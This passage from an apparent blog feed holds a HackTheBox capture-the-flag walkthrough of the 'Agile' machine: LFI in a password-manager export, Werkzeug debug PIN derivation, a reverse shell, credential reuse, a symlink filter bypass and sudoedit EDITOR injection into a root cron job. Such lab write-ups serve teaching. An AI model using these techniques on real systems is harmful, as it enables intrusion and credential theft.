      <li>Got <code class="language-plaintext highlighter-rouge">user.txt</code></li>
      <li><code class="language-plaintext highlighter-rouge">sudo</code> perms configured, but no read access to the script.</li>
      <li>Found a cred for a git remote origin.</li>
      <li>Password was reused by user <code class="language-plaintext highlighter-rouge">cody</code> on local Gitea instance.</li>
      <li>Pulled Gitea <code class="language-plaintext highlighter-rouge">adminstrator</code> creds from docker config;
        <ul>
          <li>Found source code of the <code class="language-plaintext highlighter-rouge">sudo</code> script.</li>
          <li>Identified a relative call to a local script.</li>
          <li>Hijacked it to gain code execution as <code class="language-plaintext highlighter-rouge">root</code>.</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="python" /><category term="werkzeug" /><category term="apache" /><category term="tunnel" /><category term="searchor" /><category term="gitea" /><category term="docker" /><category term="docker-inspect" /><summary type="html"><![CDATA[Busqueda is a nice easy linux machine on HackTheBox. It starts with a web application that’s vulnerable to RCE. Once on the box, you will find a GIT repo that has a cred in it’s remote origin config, which will give you access to a Gitea instance. Privesc is by exploiting a custom script with sudo perms.]]></summary></entry><entry><title type="html">Agile - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/agile.html" rel="alternate" type="text/html" title="Agile - HackTheBox" /><published>2023-08-05T00:00:00+01:00</published><updated>2023-08-05T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/agile</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/agile.html"><![CDATA[<p><strong>Agile</strong> is a medium linux box by 0xdf featuring a simple web-based LFI that could be used to bypass PIN validation in the <em>Werkzeug</em> debug console. Once on the box, you’ll recover some creds from a MySQL database and gain access to a local user account. You’ll then be required to exploit a previously discovered vulnerability but this time using a local symlink to get through a filter, and then exploit <code class="language-plaintext highlighter-rouge">sudoedit</code> and a cron job that uses python’s virtualenv to gain code execution as <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p><br /></p>

<h3 id="about">About</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230324102949.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230324103020.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Wed Mar 15 06:47:26 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.203
Nmap scan report for agile (10.10.11.203)
Host is up (0.44s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 15 06:48:32 2023 -- 1 IP address (1 host up) scanned in 66.77 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p>Going to the web page redirected to <code class="language-plaintext highlighter-rouge">superpass.htb</code>, which I then added to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file;</p>

<p><img src="/assets/img/Pasted image 20230324103938.png" alt="" /></p>

<p>There is a <em>getting started</em> link at the bottom of the page, which redirect to a login form;</p>

<p><img src="/assets/img/Pasted image 20230324104049.png" alt="" /></p>

<p>Clicking the <em>register</em> button, I was able to create an account, and login;</p>

<p><img src="/assets/img/Pasted image 20230324104254.png" alt="" /></p>

<p>The application is a custom web-based password manager. Checking <em>burp</em>, the application issued us with a token following login;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>session=.eJwtjkuKwzAQRK8ieh0GtSRLap8i-yGEltQdG5wPlrMKuftoMauiqOLxPnDVjfsiHebfD5hjBNyld74JnOC8CXcx2_Nm1oc5noZrHaM5lrWb1_j8wOV7OQ3ILn2B-djfMtraYAas2VEkLllTLmhLyMlHL7lZVGIqNgVN0-QImwRfGjYUVinqY_UanNQYAmkNwgOktobJZVsc-ZgjVXLosXkXlDG1zIVIHDvbkFOzqQz967vL_m-T4PsHJgRGWg.ZB1wLQ.O5sxCFDdi0TGl0bQOQvJrPSjISE
</pre></td></tr></tbody></table></code></pre></div></div>

<p>That looked a bit like a JWT, but the algorithm part is missing. Attempting to base64-decode the payload part of the token failed, likely due to the the <code class="language-plaintext highlighter-rouge">-</code> and <code class="language-plaintext highlighter-rouge">_</code> symbols in the payload. Some encoders replace <code class="language-plaintext highlighter-rouge">+</code> and <code class="language-plaintext highlighter-rouge">/</code> with <code class="language-plaintext highlighter-rouge">-</code> and <code class="language-plaintext highlighter-rouge">_</code>, respectively. After replacing them, the payload decodes to a zlib-compressed data, which decompresses to a JSON object;</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"_flashes"</span><span class="p">:[{</span><span class="nl">" t"</span><span class="p">:[</span><span class="s2">"message"</span><span class="p">,</span><span class="s2">"Please log in to access this page."</span><span class="p">]}],</span><span class="nl">"_fresh"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nl">"_id"</span><span class="p">:</span><span class="s2">"1c82969ab8f78b10b487363e8d01f9a9b074f755291de43bd1d1eafebf36c3f42ec6449fc4ea296f0c45280b2936869c92131d324fa17d8ab99e2a20d1a7d07b"</span><span class="p">,</span><span class="nl">"_user_id"</span><span class="p">:</span><span class="s2">"17"</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>So I wrote a simple script that, when given a token payload as an argument, decodes it, and when given a file, reads it as JSON and encode it;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">zlib</span><span class="p">,</span> <span class="n">base64</span>

<span class="k">def</span> <span class="nf">token_decode</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
  <span class="n">token</span> <span class="o">=</span> <span class="n">token</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"-"</span><span class="p">,</span> <span class="s">"+"</span><span class="p">)</span>
  <span class="n">token</span> <span class="o">=</span> <span class="n">token</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"_"</span><span class="p">,</span> <span class="s">"/"</span><span class="p">)</span>
  <span class="k">while</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">token</span> <span class="o">+=</span> <span class="s">"="</span>
  <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Base64: </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">zlib</span><span class="p">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
  <span class="n">wfo</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"token_data.json"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>
  <span class="n">wfo</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
  <span class="n">wfo</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
  <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] JSON: </span><span class="si">{</span><span class="n">data</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">data</span>

<span class="k">def</span> <span class="nf">token_encode</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">zlib</span><span class="p">.</span><span class="n">compress</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">encode</span><span class="p">())).</span><span class="n">decode</span><span class="p">()</span>
  <span class="k">while</span> <span class="n">data</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">"="</span><span class="p">):</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"+"</span><span class="p">,</span> <span class="s">"-"</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="s">"_"</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Token: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">data</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
  <span class="n">token</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
  <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
    <span class="n">token_encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="n">token_decode</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Multiple attempts to manipulate the token using this script failed, so I moved on.</p>

<p>The password manager has an option to <em>export</em> passwords in the vault, which generated a CSV file of passwords for download;</p>

<p><img src="/assets/img/Pasted image 20230324105930.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230324110102.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">fn</code> parameter looks interesting. Testing it, it was found to be vulnerable to <em>Local File Inclusion (LFI)</em>;</p>

<p><img src="/assets/img/Pasted image 20230324110256.png" alt="" /></p>

<p>Giving the parameter an invalid file generated a detailed debug message that exposes the web app as a <em>Flask/Werkzeug</em> application. This indicate the server is running in debug mode. Going to the <code class="language-plaintext highlighter-rouge">/console</code> route (the default debug console route for Flask) however gave a <strong>404</strong> message;</p>

<p><img src="/assets/img/Pasted image 20230324110755.png" alt="" /></p>

<p>This is odd since the <strong>404</strong> page returned above differs with the ones returned by the server when requesting an invalid route;</p>

<p><img src="/assets/img/Pasted image 20230324110905.png" alt="" /></p>

<p>Hovering over a line in the debug error output showed a small terminal icon to the right;</p>

<p><img src="/assets/img/Pasted image 20230324111006.png" alt="" /></p>

<p>Clicking it prompted us for a debug pin, which we don’t have;</p>

<p><img src="/assets/img/Pasted image 20230324111020.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="foothold">Foothold</h3>
<p><br /></p>

<h4 id="enumeration-using-lfi">Enumeration using LFI</h4>
<p><br /></p>

<p>Taking advantage of the LFI bug, and the debug error output, I was able to extract a lot from the system;</p>
<ul>
  <li><strong>4</strong> local users (<code class="language-plaintext highlighter-rouge">/etc/passwd</code>) - <em>corum</em>, <em>runner</em>, <em>edwards</em>, <em>dev_admin</em></li>
  <li>Hidden subdomain <code class="language-plaintext highlighter-rouge">test.superpass.htb</code> (<code class="language-plaintext highlighter-rouge">/etc/hosts</code>). Can’t access this domain from my box as it keeps redirecting to <code class="language-plaintext highlighter-rouge">superpass.htb</code>.</li>
  <li>Process command (<code class="language-plaintext highlighter-rouge">/proc/self/cmdline</code>) - <code class="language-plaintext highlighter-rouge">/app/venv/bin/python3/app/venv/bin/gunicorn--bind127.0.0.1:5000--threads=10--timeout600wsgi:app</code></li>
  <li>Environment vars (<code class="language-plaintext highlighter-rouge">/proc/self/environ</code>) - <code class="language-plaintext highlighter-rouge">LANG=C.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/binHOME=/var/wwwLOGNAME=www-dataUSER=www-dataINVOCATION_ID=9c2427940e444f78a89d7d86fde2dc58JOURNAL_STREAM=8:32855SYSTEMD_EXEC_PID=1090CONFIG_PATH=/app/config_prod.json</code>
    <ul>
      <li>MySQL creds in <code class="language-plaintext highlighter-rouge">/app/config_prod.json</code> - <code class="language-plaintext highlighter-rouge">superpassuser:dSA6l7q*yIVs$39Ml6ywvgK</code></li>
    </ul>
  </li>
  <li>Application entrypoint:  <code class="language-plaintext highlighter-rouge">/app/app/superpass/app.py</code>
    <ul>
      <li>From there traced all different parts of the app, and downloaded them for analysis.</li>
    </ul>
  </li>
</ul>

<p>The code responsible for the export and the LFI was found in <code class="language-plaintext highlighter-rouge">views/vault_views.py</code>;</p>

<p><img src="/assets/img/Pasted image 20230324112717.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">generate_csv()</code> function is defined in <code class="language-plaintext highlighter-rouge">services/password_service.py</code>;</p>

<p><img src="/assets/img/Pasted image 20230324112931.png" alt="" /></p>

<p>I thought of finding a way to access other users password exports if I could figure out how the random string appended to the exported filename is generated. The <code class="language-plaintext highlighter-rouge">get_random()</code> function used is defined in <code class="language-plaintext highlighter-rouge">services/utility_service.py</code>;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">datetime</span>
<span class="kn">import</span> <span class="nn">hashlib</span>

<span class="k">def</span> <span class="nf">get_random</span><span class="p">(</span><span class="n">chars</span><span class="o">=</span><span class="mi">20</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">()).</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"SeCReT?!"</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="n">chars</span><span class="p">]</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>It looks pretty solid, so I moved on.</p>

<p><br /></p>

<h4 id="werkzeug-debug-console-pin">Werkzeug Debug Console PIN</h4>
<p><br /></p>

<p>Looking for possible ways to guess the console PIN, I found <a href="https://github.com/wdahlenburg/werkzeug-debug-console-bypass">this guide</a>. The README explains in great detail how to effectively guess the console PIN of a <em>Werkzeug</em> server provided you have an LFI on the host. I was able to get it to work after some tweaks.</p>

<p>The file <code class="language-plaintext highlighter-rouge">werkzeug-pin-bypass.py</code> has two arrays that need to be configured according to the target;</p>

<p><img src="/assets/img/Pasted image 20230324114021.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">probably_public_bits</code>;</p>
<ul>
  <li>The username is <code class="language-plaintext highlighter-rouge">www-data</code> in our case.</li>
  <li>The third item set to <code class="language-plaintext highlighter-rouge">Flask</code> is <code class="language-plaintext highlighter-rouge">wsgi_app</code> in our case. I found this by running the given command <code class="language-plaintext highlighter-rouge">getattr(app, '__name__', getattr(app.__class__, '__name__'))</code> in a local instance of the web app. This seems to be the combination of the entrypoint file used by <code class="language-plaintext highlighter-rouge">gunicorn</code> (<code class="language-plaintext highlighter-rouge">wsgi.py</code>) and the web app entrypoint (<code class="language-plaintext highlighter-rouge">app.py</code>).</li>
  <li>Full path of Flask library - <code class="language-plaintext highlighter-rouge">/app/venv/lib/python3.10/site-packages/flask/app.py</code></li>
</ul>

<p><code class="language-plaintext highlighter-rouge">private_bits</code>;</p>
<ul>
  <li>Can’t run <code class="language-plaintext highlighter-rouge">uuid.getnode()</code> on the box obviously, and <code class="language-plaintext highlighter-rouge">/sys/class/net/ens33/address</code> does not exist. I read <code class="language-plaintext highlighter-rouge">/proc/self/net/addr</code> to get the interface the service is using, which was found to be <code class="language-plaintext highlighter-rouge">eth0</code>. Then I read <code class="language-plaintext highlighter-rouge">/sys/class/net/eth0/address</code> to get the address, which I converted to int. This value seems to have changed from when I first did the box, so you may need to regenerate.</li>
  <li>Looking at the other code given for generating machine ID, for this box it will be contents of <code class="language-plaintext highlighter-rouge">/etc/machine-id</code> + <code class="language-plaintext highlighter-rouge">superpass.service</code> (from <code class="language-plaintext highlighter-rouge">/proc/self/cgroup</code>). This turn out to be <code class="language-plaintext highlighter-rouge">ed5b159560f54721827644bc9b220d00superpass.service</code></li>
</ul>

<p>Plugging all these parameters in, we got a PIN;</p>

<p><img src="/assets/img/Pasted image 20230324120542.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230324120611.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230324120640.png" alt="" /></p>

<p>Running the script gave me a PIN, and it was accepted by the server. I then used the python console to spawn a BASH reverse shell;</p>

<p><img src="/assets/img/Pasted image 20230324120804.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230324121106.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230324121122.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="user">User</h3>
<p><br /></p>

<p>With a shell on the box as <code class="language-plaintext highlighter-rouge">www-data</code>, I can now connect to the local MySQL server whose creds I got earlier;</p>

<p><img src="/assets/img/Pasted image 20230324121353.png" alt="" /></p>

<p>The password in the <code class="language-plaintext highlighter-rouge">users</code> table are all hashed, but the ones in <code class="language-plaintext highlighter-rouge">passwords</code> table are plain;</p>

<p><img src="/assets/img/Pasted image 20230324121526.png" alt="" /></p>

<p>The creds of <code class="language-plaintext highlighter-rouge">corum</code> are of interest as that’s a valid local user. Testing them, I got access to the local user account of <code class="language-plaintext highlighter-rouge">corum</code> over SSH using the password <code class="language-plaintext highlighter-rouge">5db7caa1d13cc37c9fc2</code>;</p>

<p><img src="/assets/img/Pasted image 20230324121718.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>User has no special groups, nor sudo perms. Checking the <em>nginx</em> config files for the server at <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/</code>, I understood why we couldn’t access <code class="language-plaintext highlighter-rouge">/console</code> directly;</p>

<p><img src="/assets/img/Pasted image 20230324122202.png" alt="" /></p>

<p>The config for the vhost <code class="language-plaintext highlighter-rouge">test.superpass.nginx</code> is defined in <code class="language-plaintext highlighter-rouge">superpass-test.nginx</code>. The service is listening on port <code class="language-plaintext highlighter-rouge">5555</code> locally;</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="err">server</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="err">listen</span><span class="w"> </span><span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">80</span><span class="err">;</span><span class="w">
    </span><span class="err">server_name</span><span class="w"> </span><span class="err">test.superpass.htb;</span><span class="w">

    </span><span class="err">location</span><span class="w"> </span><span class="err">/static</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="err">alias</span><span class="w"> </span><span class="err">/app/app-testing/superpass/static;</span><span class="w">
        </span><span class="err">expires</span><span class="w"> </span><span class="mi">365</span><span class="err">d;</span><span class="w">
    </span><span class="p">}</span><span class="w">
    </span><span class="err">location</span><span class="w"> </span><span class="err">/</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="err">include</span><span class="w"> </span><span class="err">uwsgi_params;</span><span class="w">
        </span><span class="err">proxy_pass</span><span class="w"> </span><span class="err">http://</span><span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">5555</span><span class="err">;</span><span class="w">
        </span><span class="err">proxy_set_header</span><span class="w"> </span><span class="err">Host</span><span class="w"> </span><span class="err">$host;</span><span class="w">
        </span><span class="err">proxy_set_header</span><span class="w"> </span><span class="err">X-Real-IP</span><span class="w"> </span><span class="err">$remote_addr;</span><span class="w">
        </span><span class="err">proxy_set_header</span><span class="w"> </span><span class="err">X-Forwarded-Protocol</span><span class="w"> </span><span class="err">$scheme;</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Running <code class="language-plaintext highlighter-rouge">ps aux</code> showed the process running as the user <code class="language-plaintext highlighter-rouge">runner</code>;</p>

<p><img src="/assets/img/Pasted image 20230324122624.png" alt="" /></p>

<p>So I setup an SSH tunnel using <code class="language-plaintext highlighter-rouge">-L 5555:test.superpass.htb:5555</code> and edited my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file to map <code class="language-plaintext highlighter-rouge">test.superpass.htb</code> to <code class="language-plaintext highlighter-rouge">debian.local</code> (my localhost). It worked, and I can now access the server;</p>

<p><img src="/assets/img/Pasted image 20230324123000.png" alt="" /></p>

<p>This looks very similar to the public facing website. The sources are in <code class="language-plaintext highlighter-rouge">/app/app-testing</code>, and are owned by <code class="language-plaintext highlighter-rouge">runner</code>. The file <code class="language-plaintext highlighter-rouge">/app/config_test.json</code> is interesting, and is readable by <code class="language-plaintext highlighter-rouge">runner</code>, which the server is running as. Testing the LFI bug discovered earlier on the public instance, the local instance seems to be not vulnerable as it simply logs out the user;</p>

<p><img src="/assets/img/Pasted image 20230324123446.png" alt="" /></p>

<p>Checking the source at <code class="language-plaintext highlighter-rouge">/app/app-testing/superpass/views/vault_views.py</code>, I realised why;</p>

<p><img src="/assets/img/Pasted image 20230324123734.png" alt="" /></p>

<p>The application is checking to make sure the requested file’s extension ends with <code class="language-plaintext highlighter-rouge">.csv</code>. This would have complicated things, but since we already have a shell on the box, we could exploit this by creating a <em>symbolic link</em> whose name ends with <code class="language-plaintext highlighter-rouge">.csv</code> and point it to any file we wish.</p>

<p>My first attempt at doing this was to create the symlink in <code class="language-plaintext highlighter-rouge">/tmp</code> (<code class="language-plaintext highlighter-rouge">/var/tmp</code>). It didn’t work. I realized that all symlinks created in this directory by a user cannot be used by another user even if the other user has the required permissions on the destination file of the symlink. More <a href="https://superuser.com/questions/1157004/following-another-users-symlink">on this here</a></p>

<p>Since I am working as the user <code class="language-plaintext highlighter-rouge">corum</code>, I made my home directory readble and executable to <em>others</em> on the box. This is to allow <code class="language-plaintext highlighter-rouge">runner</code> to access files in <em>corum’s</em> home directory. I then created a symlink to the file <code class="language-plaintext highlighter-rouge">/app/config_test.json</code>. It worked, and I got a MySQL cred;</p>

<p><img src="/assets/img/Pasted image 20230324125600.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230324125628.png" alt="" /></p>

<p>A credential was found in the database for the user <code class="language-plaintext highlighter-rouge">edwards</code>, and the password <code class="language-plaintext highlighter-rouge">d07867c6267dcb5df0af</code> gave me access to his local account over SSH;</p>

<p><img src="/assets/img/Pasted image 20230324130116.png" alt="" /></p>

<p>The user <code class="language-plaintext highlighter-rouge">edwards</code> has permissions to use <code class="language-plaintext highlighter-rouge">sudoedit</code> to edit a file with privileges of user and group <code class="language-plaintext highlighter-rouge">dev_admin</code>. You can trigger this with the command;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>sudoedit <span class="nt">-u</span> dev_admin /app/config_test.json
</pre></td></tr></tbody></table></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">sudoedit</code> uses the <code class="language-plaintext highlighter-rouge">$EDITOR</code> environment variable to decide which editor to use when viewing a file. By setting it to <code class="language-plaintext highlighter-rouge">vim &lt;file&gt;</code>, we could use this to read/write to any file that has permissions for user or group <code class="language-plaintext highlighter-rouge">dev_admin</code>.</p>

<p>Further enumeration showed that <code class="language-plaintext highlighter-rouge">/app/test_and_update.sh</code> is run as cron task by root user;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c"># update prod with latest from testing constantly assuming tests are passing</span>

<span class="nb">echo</span> <span class="s2">"Starting test_and_update"</span>
<span class="nb">date</span>

<span class="c"># if already running, exit</span>
ps auxww | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"grep"</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"pytest"</span> <span class="o">&amp;&amp;</span> <span class="nb">exit

echo</span> <span class="s2">"Not already running. Starting..."</span>

<span class="c"># start in dev folder</span>
<span class="nb">cd</span> /app/app-testing

<span class="c"># system-wide source doesn't seem to happen in cron jobs</span>
<span class="nb">source</span> /app/venv/bin/activate

<span class="c"># run tests, exit if failure</span>
pytest <span class="nt">-x</span> 2&gt;&amp;1 <span class="o">&gt;</span>/dev/null <span class="o">||</span> <span class="nb">exit</span>

<span class="c"># tests good, update prod (flask debug mode will load it instantly)</span>
<span class="nb">cp</span> <span class="nt">-r</span> superpass /app/app/
<span class="nb">echo</span> <span class="s2">"Complete!"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The script simply activates a python virtual environment by <em>sourcing</em> <code class="language-plaintext highlighter-rouge">/app/venv/bin/activate</code>, run some tests using <code class="language-plaintext highlighter-rouge">pytest</code>, and copy all the contents of <code class="language-plaintext highlighter-rouge">/app/app-testing/superpass/</code> to <code class="language-plaintext highlighter-rouge">/app/app/</code>. Checking the permissions of the files involved, <code class="language-plaintext highlighter-rouge">/app/venv/bin/activate</code> was found to be <strong>writable</strong> to the group <code class="language-plaintext highlighter-rouge">dev_admin</code>;</p>

<p><img src="/assets/img/Pasted image 20230324131518.png" alt="" /></p>

<p>This is very interesting since the file is executed as a script. Setting my <code class="language-plaintext highlighter-rouge">$EDITOR</code> variable to <code class="language-plaintext highlighter-rouge">vim /app/venv/bin/activate</code>;</p>

<p><img src="/assets/img/Pasted image 20230324131854.png" alt="" /></p>

<p>Strangely, it opened the file in read-only mode. I had to add <code class="language-plaintext highlighter-rouge">--</code> between <code class="language-plaintext highlighter-rouge">vim</code> and the target file before it worked;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">EDITOR</span><span class="o">=</span><span class="s1">'vim -- /app/venv/bin/activate'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/Pasted image 20230324132404.png" alt="" /></p>

<p>Few seconds later, I got a shell;</p>

<p><img src="/assets/img/Pasted image 20230324132547.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Web app has open registration.
    <ul>
      <li>It is a web-based password manager.</li>
      <li>Export feature found to be vulnerable to LFI.</li>
      <li>Exploited it to generate Werkzeug console PIN, and gained RCE.</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">www-data</code>;
    <ul>
      <li>Recovered creds of user <code class="language-plaintext highlighter-rouge">corum</code> from local MySQL using creds in <code class="language-plaintext highlighter-rouge">/app/config_prod.json</code>.</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">corum</code>;
    <ul>
      <li>Got <code class="language-plaintext highlighter-rouge">user.txt</code></li>
      <li>Setup an SSH tunnel to access <code class="language-plaintext highlighter-rouge">test.superpass.htb:5555</code>.</li>
      <li>Bypassed LFI filter using local symlinks to dump <code class="language-plaintext highlighter-rouge">/app/config_test.json</code>.</li>
      <li>Used it access local MySQL and found creds for <code class="language-plaintext highlighter-rouge">edwards</code>.</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">edwards</code>;
    <ul>
